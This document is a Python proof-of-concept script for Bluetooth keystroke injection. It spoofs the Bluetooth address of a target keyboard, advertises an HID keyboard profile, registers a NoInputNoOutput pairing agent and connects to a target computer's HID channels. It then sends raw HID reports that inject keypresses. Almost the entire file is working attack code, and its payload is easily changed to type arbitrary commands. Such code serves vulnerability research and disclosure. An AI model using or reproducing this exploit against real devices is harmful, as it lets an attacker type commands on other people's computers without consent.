#!/usr/bin/env python3

from gi.repository import GLib
from pydbus import SessionBus, SystemBus
from multiprocessing import Process
from threading import Thread
import argparse
import bluetooth
import binascii
import os
import re
import sys
import time
import socket
import struct
import subprocess

def run_agent():
  class Agent(object):
    """<node><interface name='org.bluez.Agent1'></interface></node>"""
  loop = GLib.MainLoop()
  SessionBus().publish("test.agent", Agent())
  bluez = SystemBus().get("org.bluez")
  bluez.RegisterAgent("/test/agent", "NoInputNoOutput")
  bluez.RequestDefaultAgent("/test/agent")
  print("'NoInputNoOutput' pairing-agent running")
  loop.run()

parser = argparse.ArgumentParser(description='Keystroke Injection POC')
parser.add_argument('-i', '--interface', type=str, required=True, help='Bluetooth controller')
parser.add_argument('-k', '--keyboard', type=str, required=True, help='Bluetooth address of target keyboard')
parser.add_argument('-c', '--computer', type=str, required=True, help='Bluetooth address of target computer')
args = parser.parse_args()

assert(re.fullmatch(r"hci\d+", args.interface))
assert(re.fullmatch(r"([a-fA-F0-9]{2}:){5}[a-fA-F0-9]{2}", args.keyboard))
assert(re.fullmatch(r"([a-fA-F0-9]{2}:){5}[a-fA-F0-9]{2}", args.computer))

computer_addr = args.computer
keyboard_addr = args.keyboard

# adopt the Bluetooth address of the target keyboard
os.system("sudo bdaddr -i %s %s" % (args.interface, args.keyboard))
os.system("sudo hciconfig %s reset" % args.interface)
os.system("sudo hciconfig %s up" % args.interface)
res = subprocess.check_output(["hciconfig", args.interface])
addr = res.decode().split("\n")[1].split("BD Address: ")[1].split(" ")[0]
if addr != args.keyboard:
    print("Error setting Bluetooth address, aborting!")
    sys.exit(1)

# assign a generic BT-keyboard device-name and class id
os.system("sudo hciconfig %s name Keyboard" % args.interface)
os.system("sudo hciconfig %s class 0x002540" % args.interface)

# add the BT-HID SDP profile (HID control and HID interrupt)
os.system("sudo sdptool add KEYB")

# start a 'NoInputNoOutput' pairing agent
agent_proc = Process(target=run_agent)
agent_proc.start()
time.sleep(0.25)

# enable SSP (secure simple pairing)
os.system("sudo btmgmt -i %s ssp on" % args.interface)

# make connection attempts to HID-control until successful
while True:
    try:
        c17 = bluetooth.BluetoothSocket(bluetooth.L2CAP)
        print("connecting to PSM 17")
        c17.connect((computer_addr, 17))
        print("successfully connected to PSM 17 (HID Control)")
        break
    except Exception as ex:
        print("error connecting to PSM 17:", str(ex))
        time.sleep(0.01)

# connect to HID-interrupt
c19 = bluetooth.BluetoothSocket(bluetooth.L2CAP)
print("connecting to PSM 19")
c19.connect((computer_addr, 19))
print("successfully connected to PSM 19 (HID Interrupt)")

# inject 'tab' keypresses for 5 seconds
print("injecting 5 seconds of 'tab' keypresses")
t0 = time.time()
while time.time() - t0 < 5.0:
  c19.send(b"\xa1\x01\x00\x00\x2b\x00\x00\x00\x00\x00\x00")
  time.sleep(0.01)
  c19.send(b"\xa1\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00")
  time.sleep(0.01)

# cleanup and exit
os.system("sudo bdaddr -i %s 12:34:56:78:9A:BC" % args.interface)
os.system("sudo hciconfig %s reset" % args.interface)
c19.close()
c17.close()
agent_proc.kill()
sys.exit(0)
